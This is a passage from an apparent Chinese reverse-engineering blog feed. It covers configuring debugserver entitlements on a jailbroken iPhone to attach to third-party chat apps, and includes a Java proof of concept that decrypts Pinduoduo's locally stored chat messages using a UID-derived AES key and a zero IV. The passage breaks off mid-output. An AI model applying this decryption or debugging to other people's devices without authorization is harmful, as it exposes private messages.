rel="noopener">https://meilbn.com/2019/08/23/install-reveal2loader-on-jailbreak-device-ios12/#0x03_%E6%9B%B4%E6%96%B0_RevealServer-framework</a></p><p>启动WhatsApp并打开聊天对话框，然后用Reveal查看WhatsApp的消息控件，得知是WAMessaegContainerView类。<br><img src="/iOS%E5%BA%94%E7%94%A8%E9%80%86%E5%90%91%E4%B8%8E%E5%AE%89%E5%85%A8-WhatsApp%E5%88%86%E6%9E%90/image-20200705213020250.png" alt="image-20200705213020250"></p><h4 id="VSCode-查找切入点"><a href="#VSCode-查找切入点" class="headerlink" title="VSCode 查找切入点"></a>VSCode 查找切入点</h4><p>VSCode打开用class-dump出来的WhatsApp头文件，搜索<code>WAMessageContainerView</code>头文件然后找到可疑的方法，由于我们是要做长按消息然后弹出框里面加收藏的功能，所以找到一个可疑的方法<code>handleLongPressAtPoint</code>,字面意思就是长按</p><p><img src="/iOS%E5%BA%94%E7%94%A8%E9%80%86%E5%90%91%E4%B8%8E%E5%AE%89%E5%85%A8-WhatsApp%E5%88%86%E6%9E%90/image-20200705214346733.png" alt="image-20200705214346733"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;庆总的《iOS应用逆向与安全》看得也差不多了，根据最后一张，自己也分析下最新版本的WhatsApp软件的分析。&lt;/p&gt;
&lt;p&gt;版本：2.20.51&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;盗墓准备：砸壳&quot;&gt;&lt;a href=&quot;#盗墓准备：
      
    
    </summary>
    
    
      <category term="逆向" scheme="https://vxer-lee.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="iOS逆向" scheme="https://vxer-lee.github.io/tagsssss/iOS%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>lldb调试大全</title>
    <link href="https://vxer-lee.github.io/lldb%E8%B0%83%E8%AF%95%E5%A4%A7%E5%85%A8.html"/>
    <id>https://vxer-lee.github.io/lldb%E8%B0%83%E8%AF%95%E5%A4%A7%E5%85%A8.html</id>
    <published>2020-02-06T09:31:34.000Z</published>
    <updated>2020-08-14T05:07:22.629Z</updated>
    
    <content type="html"><![CDATA[<p>接上一篇,《iOS13 动态调试配置之debugserver》,配置好debugserver ,接下来就可以用lldb来动态调试应用。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;接上一篇,《iOS13 动态调试配置之debugserver》,配置好debugserver ,接下来就可以用lldb来动态调试应用。&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="逆向" scheme="https://vxer-lee.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="iOS逆向" scheme="https://vxer-lee.github.io/tagsssss/iOS%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>iOS13 动态调试配置之debugserver</title>
    <link href="https://vxer-lee.github.io/iOS13-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E9%85%8D%E7%BD%AE%E4%B9%8Bdebugserver.html"/>
    <id>https://vxer-lee.github.io/iOS13-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E9%85%8D%E7%BD%AE%E4%B9%8Bdebugserver.html</id>
    <published>2020-02-06T09:30:34.000Z</published>
    <updated>2020-08-01T14:37:46.585Z</updated>
    
    <content type="html"><![CDATA[<p>疫情期间家里没网🤣，好久没更新了，刚回到杭州给自己iOS逆向充充电。[武汉加油💪]</p><hr><p>iOS逆向里面比较重要的几项技能：动态调试、静态分析、HOOK关键函数、重签名</p><p>先来讲下动态调试，iOS动态调试需要一个服务端和客户端程序，服务端程序在手机上监听要动态调试程序的进程ID或是程序名，客户端程序在Mac OS系统上运行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">服务端程序:debugserver</span><br><span class="line">客户端程序:lldb</span><br><span class="line"><span class="comment">#这两个程序不用额外的去外网下载，只要你的Mac电脑有装XCode，并且进行真机调试过（真机调试一般可以在淘宝买UDID开发者证书，就是和你手机UDID绑定的证书那么你就可以在你手机上安装开发你的APP|土豪（开发者账号））</span></span><br></pre></td></tr></table></figure><p>只要你手机进行真机调试过，那么在你手机的这个目录下就会有debugserver</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/Developer/usr/bin/debugserver</span><br><span class="line"><span class="comment">#不过这个debugserver 默认只能调试自己开发的APP，我们逆向当然是要逆别人的程序，所以想要debugserver能调试三方APP，需要进行一些修改，下面就是修改的一些重点。</span></span><br></pre></td></tr></table></figure><h3 id="0x00-配置debugserver-赋予权限"><a href="#0x00-配置debugserver-赋予权限" class="headerlink" title="#0x00 配置debugserver 赋予权限"></a>#0x00 配置debugserver 赋予权限</h3><p>debugserver默认只能调试自己开发的应用，调试其他应用会抛异常<code>unable to start the exception thread</code>。默认的debugserver缺少<code>task_for_pid()</code>权限，因此需要给debugserver赋予task_for_pid权限。——这是网上摘抄的话</p><p>我发现网上配置debugserver的方法已经过时，不适用iOS13系统，导致debugserver还是无法调试三方APP，所以按照如下方法进行。</p><p><strong>1、 新建一个文件名为ent.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">plist</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"-//Apple//DTD PLIST 1.0//EN"</span> <span class="meta-string">"http://www.apple.com/DTDs/PropertyList-1.0.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plist</span> <span class="attr">version</span>=<span class="string">"1.0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dict</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.backboardd.debugapplications<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.backboardd.launchapplications<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.diagnosticd.diagnostic<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.frontboard.debugapplications<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.frontboard.launchapplications<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.security.network.client<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.security.network.server<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.springboard.debugapplications<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.system-task-ports<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>get-task-allow<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>platform-application<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>run-unsigned-code<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>task_for_pid-allow<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dict</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plist</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>2、用ldid对debugserver签名 赋予权限</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ldid -Sxml全路径 debugserver全路径`</span><br><span class="line">例如：`ldid -Sent.xml debugserver</span><br></pre></td></tr></table></figure><p>这里要SSH连入iPhone手机执行命令：需要越狱您的iPhone,不会的请去看 <a href="https://mrmad.com.tw/category/jb/jailbreak" target="_blank" rel="noopener">疯先生越狱</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#开启端口转发,数据线连SSH</span></span><br><span class="line">iproxy 2222 44        <span class="comment">#默认用Checkra1n越狱的端口号为44，其余的默认为22</span></span><br><span class="line"><span class="comment">#连入iPhone SSH</span></span><br><span class="line">ssh root@localhost -p 2222 <span class="comment">#iPhone默认ssh密码,alpine</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#切换到debugserver存在的目录</span></span><br><span class="line">iPhone:~ root<span class="comment"># cd /Developer/usr/bin/</span></span><br><span class="line">iPhone:/Developer/usr/bin root<span class="comment"># ls</span></span><br><span class="line">DTDeviceArbitration*  ScreenShotr*  axauditd*  debugserver*</span><br><span class="line"></span><br><span class="line"><span class="comment">#新建ent.xml文件</span></span><br><span class="line">iPhone:/Developer/usr/bin root<span class="comment"># vim ent.xml   #将1、里面的ent.xml内容复制进去，并且保存</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#最后ldid赋予权限</span></span><br><span class="line">iPhone:/Developer/usr/bin root<span class="comment"># ldid -Sent.xml debugserver</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#拷贝到系统目录</span></span><br><span class="line">iPhone:/Developer/usr/bin root<span class="comment"># copy ./debugserver /usr/bin</span></span><br></pre></td></tr></table></figure><p><img src="/iOS13-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E9%85%8D%E7%BD%AE%E4%B9%8Bdebugserver/%E6%88%AA%E5%B1%8F2020-02-06%E4%B8%8B%E5%8D%887.52.51.png" alt="截屏2020-02-06下午7.52.51"></p><h3 id="0x01-验证debugserver-进行动态调试"><a href="#0x01-验证debugserver-进行动态调试" class="headerlink" title="#0x01 验证debugserver 进行动态调试"></a>#0x01 验证debugserver 进行动态调试</h3><p>配置好iPhone端的debugserver后，就可以在Mac电脑上用lldb远程进行动态调试了<strong>lldb调试大全后续会讲</strong>，此次注重debugserver的配置，lldb一笔带，只要知道lldb是Mac上的客户端用来动态调试。</p><p>以调试Sugram 聊天软件为例</p><p>手机端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看Sugram的进程ID</span></span><br><span class="line">iPhone:~ root<span class="comment"># ps aux|grep "Sugram"</span></span><br><span class="line">mobile          6542   0.0  2.9  5055392  59136   ??  Ss    8:38PM   0:00.51 /var/containers/Bundle/Application/12CA134A-E92A-4F35-BEAA-542F84A0A39F/Sugram.app/Sugram</span><br><span class="line"></span><br><span class="line"><span class="comment">#注入方式对Sugram进行监听</span></span><br><span class="line">iPhone:~ root<span class="comment"># debugserver 127.0.0.1:1234 --attach 6542</span></span><br></pre></td></tr></table></figure><p>这时候被注入监听的那个APP就会进入卡死状态，因为debugserver已经对Sugram进行调试状态。</p><p>电脑端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#先用iProxy 转发debugserver监听的端口</span></span><br><span class="line">iproxy 1234 1234</span><br><span class="line"><span class="comment">#进入lldb 进行远程调试</span></span><br><span class="line">lldb</span><br><span class="line">(lldb) process connect connect://localhost:1234</span><br></pre></td></tr></table></figure><h3 id="0x02-成功！"><a href="#0x02-成功！" class="headerlink" title="#0x02 成功！"></a>#0x02 成功！</h3><p>出现如下画面说明debugserver 配置正确，lldb也可以进行动态调试了。😁😁  –专注逆向、网络安全 Lee</p><p><img src="/iOS13-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E9%85%8D%E7%BD%AE%E4%B9%8Bdebugserver/%E6%88%AA%E5%B1%8F2020-02-06%E4%B8%8B%E5%8D%888.48.39.png" alt="截屏2020-02-06下午8.48.39"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;疫情期间家里没网🤣，好久没更新了，刚回到杭州给自己iOS逆向充充电。[武汉加油💪]&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;iOS逆向里面比较重要的几项技能：动态调试、静态分析、HOOK关键函数、重签名&lt;/p&gt;
&lt;p&gt;先来讲下动态调试，iOS动态调试需要一个服务端和客户端程序，服务端程
      
    
    </summary>
    
    
      <category term="逆向" scheme="https://vxer-lee.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="iOS逆向" scheme="https://vxer-lee.github.io/tagsssss/iOS%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>拼多多数据库解密</title>
    <link href="https://vxer-lee.github.io/%E6%8B%BC%E5%A4%9A%E5%A4%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A7%A3%E5%AF%86.html"/>
    <id>https://vxer-lee.github.io/%E6%8B%BC%E5%A4%9A%E5%A4%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A7%A3%E5%AF%86.html</id>
    <published>2020-01-08T06:22:52.000Z</published>
    <updated>2020-08-01T14:37:54.964Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-拼多多数据库"><a href="#0x00-拼多多数据库" class="headerlink" title="0x00 拼多多数据库"></a>0x00 拼多多数据库</h2><p>在拼多多数据库中其中的<code>t_mall_conversation</code>表中的<code>message</code>字段数据内容被加密了</p><p><img src="/%E6%8B%BC%E5%A4%9A%E5%A4%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A7%A3%E5%AF%86/image-20200119142603548.png" alt="image-20200119142603548"></p><p>提取相应的关键字：</p><blockquote><p>t_mall_conversation</p><p>message</p></blockquote><h2 id="0x01-逆向分析"><a href="#0x01-逆向分析" class="headerlink" title="0x01 逆向分析"></a>0x01 逆向分析</h2><p>在其官网找到下载地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;mcdn.yangkeduo.com&#x2F;android_dev&#x2F;2020-01-14&#x2F;b9af6563fb99283df18cbdedddef1e68.apk</span><br></pre></td></tr></table></figure><h4 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h4><p>先用Android APK查壳工具，对拼多多APK进行查壳。如果有被加固需要进行下一步的脱壳操作，如下图：拼多多APK并未被加固。</p><p><img src="/%E6%8B%BC%E5%A4%9A%E5%A4%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A7%A3%E5%AF%86/image-20200119142907538.png" alt="image-20200119142907538"></p><h4 id="反编译、关键字定位"><a href="#反编译、关键字定位" class="headerlink" title="反编译、关键字定位"></a>反编译、关键字定位</h4><p>根据关键字<code>t_mall_conversation</code>定位到处理该表与<code>message</code>加密字段的类。</p><p><img src="/%E6%8B%BC%E5%A4%9A%E5%A4%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A7%A3%E5%AF%86/image-20200119151434228.png" alt="image-20200119151434228"></p><p>在该类下继续找到<code>getMessage</code> 与 <code>setMessage</code>方法，其中getMessage为获取Pdd数据库t_mall_conversation表中Message的字段（所以解密函数也在该方法中），而setMessage为相反的设置Message字段的内容（加密函数在该方法中）。</p><p><img src="/%E6%8B%BC%E5%A4%9A%E5%A4%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A7%A3%E5%AF%86/image-20200119151637311.png" alt="image-20200119151637311"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.b(message) <span class="comment">//解密函数</span></span><br><span class="line">a.a(str)     <span class="comment">//加密函数</span></span><br></pre></td></tr></table></figure><h4 id="反编译、加密算法解析"><a href="#反编译、加密算法解析" class="headerlink" title="反编译、加密算法解析"></a>反编译、加密算法解析</h4><p>采用AES加密算法，向量为{0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}，密钥为用户UID的MD5加密取前16位，UID的值在<code>data/data/com.xunmeng.pinduoduo/files/pinUserFile</code>文件中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IV = <span class="keyword">new</span> <span class="keyword">byte</span> &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">uid = <span class="number">5564948642776</span>;</span><br><span class="line">MD5(uid) = <span class="number">479</span>EE2A088591D9856CCDC451C1B4515;</span><br><span class="line">KEY = <span class="number">479</span>EE2A088591D98;</span><br></pre></td></tr></table></figure><p>AES加密算法</p><p><img src="/%E6%8B%BC%E5%A4%9A%E5%A4%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A7%A3%E5%AF%86/image-20200119153147712.png" alt="image-20200119153147712"></p><p>UID值</p><p><img src="/%E6%8B%BC%E5%A4%9A%E5%A4%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A7%A3%E5%AF%86/image-20200119154305302.png" alt="image-20200119154305302"></p><p><img src="/%E6%8B%BC%E5%A4%9A%E5%A4%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A7%A3%E5%AF%86/image-20200119154332523.png" alt="image-20200119154332523"></p><h4 id="POC-编写、破解过程验证"><a href="#POC-编写、破解过程验证" class="headerlink" title="POC 编写、破解过程验证"></a>POC 编写、破解过程验证</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> android.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.security.Key;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//解密函数</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span>  String <span class="title">PddMsgDecrypt</span><span class="params">(String msg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (TextUtils.isEmpty(msg)) &#123;</span><br><span class="line">            <span class="keyword">return</span> msg;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//MD5加密(uid)</span></span><br><span class="line">        String md5Text = MD5Utils.digest(<span class="string">"5564948642776"</span>);</span><br><span class="line">        <span class="keyword">if</span> (TextUtils.isEmpty(md5Text)) &#123;</span><br><span class="line">            <span class="keyword">return</span> msg;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//IV</span></span><br><span class="line">        <span class="keyword">byte</span>[] iv = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">        <span class="comment">//KEY 取MD5前16位</span></span><br><span class="line">        <span class="keyword">byte</span>[] key = md5Text.substring(<span class="number">0</span>,<span class="number">16</span>).getBytes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//AES解密</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            SecretKeySpec v1 = <span class="keyword">new</span> SecretKeySpec(key, <span class="string">"AES"</span>);</span><br><span class="line">            IvParameterSpec v0_2 = <span class="keyword">new</span> IvParameterSpec(iv);</span><br><span class="line">            Cipher v2 = Cipher.getInstance(<span class="string">"AES/CBC/PKCS5Padding"</span>);</span><br><span class="line">            v2.init(<span class="number">2</span>, ((Key)v1), ((AlgorithmParameterSpec)v0_2));</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> String(v2.doFinal(Base64.decode(msg, <span class="number">2</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Throwable unstd) &#123;</span><br><span class="line">            Log.v(<span class="string">"Lee"</span>, <span class="string">"Fail to decrypt data with aes key through java"</span>);</span><br><span class="line">            <span class="keyword">return</span> msg;</span><br><span class="line">        &#125;</span><br><span class="line">     </span><br><span class="line"><span class="comment">//POC 破解过程验证</span></span><br><span class="line">PddMsgDecrypt(<span class="string">"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"</span>);</span><br></pre></td></tr></table></figure><h4 id="验证成功、成功解密"><a href="#验证成功、成功解密" class="headerlink" title="验证成功、成功解密"></a>验证成功、成功解密</h4><p><img src="/%E6%8B%BC%E5%A4%9A%E5%A4%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A7%A3%E5%AF%86/image-20200119155717365.png" alt="image-20200119155717365"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;auto_click&quot;:1,&quot;content&quot;:&quot;亲，欢迎来到拼多多，今后您在拼多多遇到的任何问题都可以咨询我哦～快快开启“多实惠，多乐趣”的购物之旅吧！&quot;,&quot;from&quot;:&#123;&quot;mall_id&quot;:&quot;606&quot;,&quot;role&quot;:&quot;mall_cs&quot;,&quot;uid&quot;:&quot;606&quot;&#125;,&quot;is_aut&quot;:0,&quot;is_rich_text&quot;:1,&quot;mallName&quot;:&quot;拼多多官方客服&quot;,&quot;msg_id&quot;:&quot;1579261690080&quot;,&quot;rich_text&quot;:&#123;&quot;content&quot;:[&#123;&quot;text&quot;:&quot;亲，欢迎来到拼多多，今后您在拼多多遇到的任何问题都可以咨询我哦～快快开启“多实惠，多乐趣”的购物之旅吧！&quot;,&quot;type&quot;:&quot;text&quot;&#125;,&#123;&quot;click_action&quot;:&#123;&quot;name&quot;:&quot;send_message&quot;,&quot;params&quot;:&#123;&quot;content&quot;:&quot;如何搜索商品&quot;&#125;&#125;,&quot;hide&quot;:0,&quot;text&quot;:&quot;如何搜索商品&quot;,&quot;type&quot;:&quot;menu_item&quot;&#125;,&#123;&quot;click_action&quot;:&#123;&quot;name&quot;:&quot;send_message&quot;,&quot;params&quot;:&#123;&quot;content&quot;:&quot;怎么在拼多多下单&quot;&#125;&#125;,&quot;hide&